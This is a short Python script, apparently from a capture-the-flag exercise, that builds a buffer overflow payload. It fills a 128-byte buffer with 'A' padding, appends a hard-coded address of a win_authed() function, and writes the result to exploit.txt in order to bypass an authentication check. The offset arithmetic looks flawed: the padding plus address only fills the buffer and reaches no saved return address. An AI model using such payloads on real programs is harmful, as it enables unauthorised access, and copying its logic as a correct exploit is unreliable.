# Define the buffer size
buffer_size = 128

# Define the address of the win_authed() function in little endian format
win_authed_address = '\x39\x23\x40\x00\x00\x00\x00\x00'

# Define the padding to fill up to the buffer size
padding = 'A' * (buffer_size - len(win_authed_address))

# Define the exploit
exploit = padding + win_authed_address

# Write the exploit to a file
with open('exploit.txt', 'w') as f:
    f.write(exploit)
